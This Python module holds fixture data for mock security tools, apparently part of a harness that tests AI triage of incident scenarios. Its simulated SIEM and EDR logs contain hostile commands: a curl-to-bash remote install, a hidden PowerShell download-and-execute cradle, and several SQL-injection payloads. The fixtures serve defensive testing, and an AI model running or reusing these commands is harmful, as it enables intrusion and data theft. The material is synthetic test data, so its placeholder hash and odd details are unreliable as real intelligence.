"""Deterministic fixture data shared by the five mock MCP servers.

Each scenario in playbook_cases.py references one or more entries here. Keeping
the fixtures in one module makes it obvious which inputs are "known" to the
mock environment and which would fall through to a not-found response.

Lookup keys are the literal strings the model is expected to extract from the
scenario text and pass through to a tool — IPs, hostnames, domain names. If a
model invents a value not present here, the server returns a not-found
response, which the harness counts as a hallucination signal.
"""

def lookup_ci(table: dict, key: str):
    """Case-insensitive dict lookup. Returns None if not found.

    The model often capitalizes hostnames differently than the fixtures
    (DC01 vs dc01); we don't want trivial casing to count as not-found.
    """
    if key in table:
        return table[key]
    lower = key.lower()
    if lower in table:
        return table[lower]
    for k, v in table.items():
        if k.lower() == lower:
            return v
    return None


# --- Threat-intel fixtures (IP) ---
# Verdicts: malicious / suspicious / benign / unknown
IP_INTEL = {
    # Internal addresses (RFC1918)
    "10.0.4.22":      {"verdict": "benign", "score": 5,  "geo": "internal", "tags": ["rfc1918"], "first_seen": None, "notes": "Internal corporate range"},
    "10.0.4.10":      {"verdict": "benign", "score": 5,  "geo": "internal", "tags": ["rfc1918"], "first_seen": None, "notes": "Internal corporate range"},
    "10.0.4.55":      {"verdict": "benign", "score": 5,  "geo": "internal", "tags": ["rfc1918"], "first_seen": None, "notes": "Internal corporate range"},
    "192.168.50.13":  {"verdict": "benign", "score": 10, "geo": "internal", "tags": ["rfc1918", "kiosk-subnet"], "first_seen": None, "notes": "Internal kiosk subnet — Administrator auth from this range is anomalous"},
    # Hostile addresses
    "41.78.122.18":   {"verdict": "malicious",  "score": 92, "geo": "NG", "tags": ["c2", "rdp-bruteforce"], "first_seen": "2026-04-22", "notes": "Recent C2 sightings; multiple corporate VPN bruteforce reports"},
    "89.248.165.74":  {"verdict": "malicious",  "score": 88, "geo": "NL", "tags": ["botnet", "wp-bruteforce"], "first_seen": "2026-03-11", "notes": "Known WordPress credential-stuffing botnet node"},
    "185.220.101.45": {"verdict": "malicious",  "score": 95, "geo": "DE", "tags": ["tor-exit", "ssh-bruteforce"], "first_seen": "2025-12-04", "notes": "Tor exit node; long history of SSH bruteforce"},
    "185.220.101.15": {"verdict": "malicious",  "score": 95, "geo": "DE", "tags": ["tor-exit", "malware-c2"], "first_seen": "2025-11-29", "notes": "Tor exit node; hosts Cobalt Strike payloads"},
    "185.62.190.13":  {"verdict": "suspicious", "score": 78, "geo": "GB", "tags": ["sqlmap", "scanner"], "first_seen": "2026-04-30", "notes": "Recent sqlmap user-agent activity across multiple targets"},
}

# --- Threat-intel fixtures (domain) ---
DOMAIN_INTEL = {
    "cdn-update.xyz":     {"verdict": "malicious",  "score": 90, "registered": "2026-04-22", "tags": ["dga-like", "dns-tunnel"], "notes": "Registered 14 days ago; TXT-record traffic dominates queries"},
    "intranet.example.com": {"verdict": "benign", "score": 0, "registered": "2018-01-04", "tags": ["corp"], "notes": "Corporate intranet"},
}

# --- Threat-intel fixtures (file hash) ---
HASH_INTEL = {
    # SHA256 of the powershell stager dropped in scenario PB-4
    "b9c2e5e8a8d8a5c0f3b2c1d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4": {
        "verdict": "malicious", "score": 96, "family": "CobaltStrike", "tags": ["beacon", "stager"],
        "notes": "Cobalt Strike beacon stager; signed TLS to 185.220.101.15",
    },
}

# --- CMDB fixtures ---
ASSETS = {
    "10.0.4.22":      {"hostname": "alice-laptop",  "criticality": "low",      "owner": "alice",       "business_unit": "marketing", "os": "macOS 14",       "tags": ["endpoint", "vpn-allowed"]},
    "alice-laptop":   {"hostname": "alice-laptop",  "criticality": "low",      "owner": "alice",       "business_unit": "marketing", "os": "macOS 14",       "tags": ["endpoint", "vpn-allowed"]},
    "10.0.4.10":      {"hostname": "webhost",       "criticality": "high",     "owner": "infra-team",  "business_unit": "platform",  "os": "Ubuntu 22.04",   "tags": ["public-facing", "wordpress"]},
    "webhost":        {"hostname": "webhost",       "criticality": "high",     "owner": "infra-team",  "business_unit": "platform",  "os": "Ubuntu 22.04",   "tags": ["public-facing", "wordpress"]},
    "10.0.4.55":      {"hostname": "ops-jumphost",  "criticality": "high",     "owner": "secops",      "business_unit": "platform",  "os": "Ubuntu 22.04",   "tags": ["jumphost", "no-egress-allowed"]},
    "ops-jumphost":   {"hostname": "ops-jumphost",  "criticality": "high",     "owner": "secops",      "business_unit": "platform",  "os": "Ubuntu 22.04",   "tags": ["jumphost", "no-egress-allowed"]},
    "WIN-DEV-04":     {"hostname": "WIN-DEV-04",    "criticality": "medium",   "owner": "dave",        "business_unit": "engineering", "os": "Windows 11",   "tags": ["developer", "office"]},
    "dc01":           {"hostname": "dc01",          "criticality": "critical", "owner": "infra-team",  "business_unit": "platform",  "os": "Windows Server 2022", "tags": ["domain-controller", "tier-0"]},
    "192.168.50.13":  {"hostname": "KIOSK-04",      "criticality": "low",      "owner": "facilities",  "business_unit": "office",    "os": "Windows 10",     "tags": ["kiosk", "no-admin-auth-expected"]},
    "KIOSK-04":       {"hostname": "KIOSK-04",      "criticality": "low",      "owner": "facilities",  "business_unit": "office",    "os": "Windows 10",     "tags": ["kiosk", "no-admin-auth-expected"]},
}

# --- SIEM fixtures ---
# Each entry maps a substring-match query pattern to a canned hit list.
# The server picks the entry whose key appears in the incoming query (lower-cased).
# Order matters: more specific keys first.
SIEM_QUERIES = [
    ("41.78.122.18", {
        "matched": 19,
        "events": [
            {"ts": "2026-05-06T03:14:01Z", "event_id": "4624", "logon_type": 10, "account": "dom_admin_01", "src_ip": "41.78.122.18", "dst_host": "DC01"},
            {"ts": "2026-05-06T03:14:48Z", "event_id": "4624", "logon_type": 10, "account": "dom_admin_01", "src_ip": "41.78.122.18", "dst_host": "FILER-02"},
            {"ts": "2026-05-06T03:15:22Z", "event_id": "4624", "logon_type": 10, "account": "dom_admin_01", "src_ip": "41.78.122.18", "dst_host": "FINANCE-DB"},
            {"ts": "2026-05-06T03:15:56Z", "event_id": "4624", "logon_type": 10, "account": "dom_admin_01", "src_ip": "41.78.122.18", "dst_host": "ENG-FILE"},
            {"ts": "2026-05-06T03:16:31Z", "event_id": "4624", "logon_type": 10, "account": "dom_admin_01", "src_ip": "41.78.122.18", "dst_host": "BACKUP-01"},
            {"note": "13 more identical 4624 events to additional internal hosts truncated"},
        ],
        "summary": "18 RDP logons from one external IP across 18 distinct internal hosts within 4 minutes — fan-out indicative of post-compromise lateral movement.",
    }),
    ("wp-login", {
        "matched": 50312,
        "events": [
            {"ts": "2026-05-06T14:01:02Z", "src_ip": "89.248.165.74", "method": "POST", "path": "/wp-login.php", "status": 401, "ua": "python-requests/2.31"},
            {"ts": "2026-05-06T14:01:02Z", "src_ip": "45.95.147.236", "method": "POST", "path": "/wp-login.php", "status": 401, "ua": "python-requests/2.31"},
            {"ts": "2026-05-06T14:01:03Z", "src_ip": "92.118.39.47",  "method": "POST", "path": "/wp-login.php", "status": 200, "user": "admin",      "note": "successful login"},
            {"ts": "2026-05-06T14:01:04Z", "src_ip": "194.31.55.18",  "method": "POST", "path": "/wp-login.php", "status": 200, "user": "wp_admin",   "note": "successful login"},
            {"ts": "2026-05-06T14:02:55Z", "src_ip": "23.94.198.44",  "method": "POST", "path": "/wp-login.php", "status": 200, "user": "siteadmin", "note": "successful login"},
            {"note": "50,000+ failed POSTs from 1,200 distinct IPs, 3 successful admin logins"},
        ],
        "summary": "Distributed credential-stuffing burst against /wp-login.php with three successful admin logins from previously-unseen IPs.",
    }),
    ("eventid=4625 ipaddress=192.168.50.13", {
        "matched": 6,
        "events": [
            {"ts": "2026-05-06T02:18:14Z", "event_id": "4625", "account": "Administrator", "logon_type": 3, "src_ip": "192.168.50.13", "host": "DC01", "reason": "BadPassword"},
            {"ts": "2026-05-06T02:18:16Z", "event_id": "4625", "account": "Administrator", "logon_type": 3, "src_ip": "192.168.50.13", "host": "DC01", "reason": "BadPassword"},
            {"ts": "2026-05-06T02:18:18Z", "event_id": "4625", "account": "Administrator", "logon_type": 3, "src_ip": "192.168.50.13", "host": "DC01", "reason": "BadPassword"},
            {"ts": "2026-05-06T02:18:21Z", "event_id": "4625", "account": "Administrator", "logon_type": 3, "src_ip": "192.168.50.13", "host": "DC01", "reason": "BadPassword"},
            {"ts": "2026-05-06T02:18:24Z", "event_id": "4625", "account": "Administrator", "logon_type": 3, "src_ip": "192.168.50.13", "host": "DC01", "reason": "BadPassword"},
            {"ts": "2026-05-06T02:21:42Z", "event_id": "4624", "account": "Administrator", "logon_type": 3, "src_ip": "192.168.50.13", "host": "DC01"},
        ],
        "summary": "5 sequential 4625 BadPassword events for Administrator from a kiosk-subnet IP, followed by a successful 4624 — classic guess-then-succeed bruteforce pattern.",
    }),
    ("dns AND host=10.0.4.55", {
        "matched": 4218,
        "events": [
            {"ts": "2026-05-06T01:02:11Z", "src_host": "ops-jumphost", "qname": "a8f3.cdn-update.xyz",      "qtype": "TXT", "resp_size": 198},
            {"ts": "2026-05-06T01:02:14Z", "src_host": "ops-jumphost", "qname": "b1c2.cdn-update.xyz",      "qtype": "TXT", "resp_size": 204},
            {"ts": "2026-05-06T01:02:18Z", "src_host": "ops-jumphost", "qname": "0d4e.cdn-update.xyz",      "qtype": "TXT", "resp_size": 201},
            {"note": "4,200+ unique TXT queries from one source to *.cdn-update.xyz over 2 hours; mean response 199 bytes"},
        ],
        "summary": "Single internal host issuing 4,200+ unique TXT queries to one external domain — DNS-tunneling exfiltration pattern.",
    }),
    ("user=bob", {
        "matched": 5,
        "events": [
            {"ts": "2026-05-06T03:17:42Z", "host": "webhost", "user": "bob", "tty": "pts/3", "command": "/usr/sbin/usermod -aG sudo svc_backup"},
            {"ts": "2026-05-06T03:17:43Z", "host": "webhost", "user": "root", "subject": "usermod[18293]", "msg": "add 'svc_backup' to group 'sudo'"},
            {"ts": "2026-05-06T03:17:43Z", "host": "webhost", "user": "root", "subject": "usermod[18293]", "msg": "add 'svc_backup' to shadow group 'sudo'"},
            {"ts": "2026-05-06T03:18:11Z", "host": "webhost", "user": "bob", "tty": "pts/3", "command": "/usr/bin/passwd svc_backup"},
            {"ts": "2026-05-06T01:42:09Z", "host": "webhost", "user": "bob", "tty": "pts/3", "command": "/usr/bin/curl -fsSL http://185.220.101.15/install.sh | bash"},
        ],
        "summary": "User 'bob' ran a remote-piped curl→bash from 185.220.101.15 then granted a service account sudo rights at 03:17.",
    }),
    ("185.62.190.13", {
        "matched": 4,
        "events": [
            {"ts": "2026-05-06T14:22:03Z", "src_ip": "185.62.190.13", "method": "GET", "path": "/products.php?id=1' OR '1'='1--",                       "status": 500},
            {"ts": "2026-05-06T14:22:04Z", "src_ip": "185.62.190.13", "method": "GET", "path": "/products.php?id=1+UNION+SELECT+username,password+...", "status": 200, "size": 4129},
            {"ts": "2026-05-06T14:22:05Z", "src_ip": "185.62.190.13", "method": "GET", "path": "/products.php?id=1;DROP+TABLE+users--",                "status": 500},
            {"ts": "2026-05-06T14:22:06Z", "src_ip": "185.62.190.13", "method": "GET", "path": "/products.php?id=1+AND+SLEEP(5)--",                    "status": 200},
        ],
        "summary": "Four classic SQL-injection payloads against /products.php?id from one external IP; one UNION SELECT returned a 4 KB body, suggesting data leakage.",
    }),
    ("185.220.101.45", {
        "matched": 9,
        "events": [
            {"ts": "2026-05-06T03:41:02Z", "host": "webhost", "subject": "sshd", "msg": "Failed password for invalid user admin from 185.220.101.45"},
            {"ts": "2026-05-06T03:41:05Z", "host": "webhost", "subject": "sshd", "msg": "Failed password for invalid user root from 185.220.101.45"},
            {"ts": "2026-05-06T03:41:08Z", "host": "webhost", "subject": "sshd", "msg": "Failed password for invalid user oracle from 185.220.101.45"},
            {"ts": "2026-05-06T03:41:20Z", "host": "webhost", "subject": "sshd", "msg": "Failed password for ubuntu from 185.220.101.45"},
            {"ts": "2026-05-06T03:43:21Z", "host": "webhost", "subject": "sshd", "msg": "Accepted password for ubuntu from 185.220.101.45"},
            {"note": "additional failed attempts truncated"},
        ],
        "summary": "Seven failed SSH logins for distinct usernames from one IP, followed two minutes later by a successful login as 'ubuntu'.",
    }),
]

# --- EDR fixtures ---
EDR_PROCESSES = {
    "WIN-DEV-04": [
        {"pid": 4112, "name": "winword.exe",     "parent": "explorer.exe", "cmdline": "WINWORD.EXE /n \"C:\\Users\\dave\\Downloads\\invoice.docm\""},
        {"pid": 4880, "name": "powershell.exe",  "parent": "winword.exe",  "cmdline": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.15/a.ps1')\""},
        {"pid": 5114, "name": "rundll32.exe",    "parent": "powershell.exe", "cmdline": "rundll32.exe C:\\ProgramData\\b.dll,Init"},
        {"pid": 612,  "name": "explorer.exe",    "parent": "userinit.exe", "cmdline": "C:\\Windows\\explorer.exe"},
    ],
    "webhost": [
        {"pid": 18290, "name": "bash",      "parent": "sshd",  "cmdline": "-bash"},
        {"pid": 18293, "name": "usermod",   "parent": "sudo",  "cmdline": "/usr/sbin/usermod -aG sudo svc_backup"},
        {"pid": 17801, "name": "curl",      "parent": "bash",  "cmdline": "curl -fsSL http://185.220.101.15/install.sh"},
        {"pid": 17802, "name": "bash",      "parent": "curl",  "cmdline": "bash"},
        {"pid": 102,   "name": "nginx",     "parent": "init",  "cmdline": "nginx: master process"},
    ],
    "dc01": [
        {"pid": 612, "name": "lsass.exe",   "parent": "wininit.exe", "cmdline": "C:\\Windows\\system32\\lsass.exe"},
        {"pid": 720, "name": "svchost.exe", "parent": "services.exe", "cmdline": "svchost.exe -k netsvcs"},
    ],
}

# --- OpenVAS fixtures ---
# scan_host(ip) returns a scan_id; get_scan_results(scan_id) returns vulns.
OPENVAS_SCANS = {
    "10.0.4.10": {
        "scan_id": "SCAN-1001",
        "vulns": [
            {"cve": "CVE-2024-32709", "cvss": 9.8, "severity": "critical", "name": "WordPress < 6.5.2 unauthenticated RCE",          "service": "http/80"},
            {"cve": "CVE-2023-22515", "cvss": 9.1, "severity": "critical", "name": "Confluence broken access control (theoretical)", "service": "n/a"},
            {"cve": "CVE-2024-1234",  "cvss": 8.6, "severity": "high",     "name": "products.php SQL injection on id parameter",     "service": "http/80"},
        ],
    },
    "webhost": {  # alias
        "scan_id": "SCAN-1001",
        "vulns": [
            {"cve": "CVE-2024-32709", "cvss": 9.8, "severity": "critical", "name": "WordPress < 6.5.2 unauthenticated RCE",          "service": "http/80"},
            {"cve": "CVE-2024-1234",  "cvss": 8.6, "severity": "high",     "name": "products.php SQL injection on id parameter",     "service": "http/80"},
        ],
    },
    "WIN-DEV-04": {
        "scan_id": "SCAN-1002",
        "vulns": [
            {"cve": "CVE-2024-26169", "cvss": 7.8, "severity": "high",   "name": "Windows Werkernel privilege escalation", "service": "smb/445"},
            {"cve": "CVE-2024-30040", "cvss": 8.8, "severity": "high",   "name": "Windows MSHTML mark-of-the-web bypass",  "service": "n/a"},
        ],
    },
    "dc01": {
        "scan_id": "SCAN-1003",
        "vulns": [
            {"cve": "CVE-2020-1472",  "cvss": 10.0, "severity": "critical", "name": "Zerologon — Netlogon EoP",        "service": "smb/445"},
            {"cve": "CVE-2022-26923", "cvss": 8.8,  "severity": "high",     "name": "AD Certificate Services EoP",     "service": "ldap/636"},
        ],
    },
    "10.0.4.55": {
        "scan_id": "SCAN-1004",
        "vulns": [],  # ops-jumphost is patched
    },
}
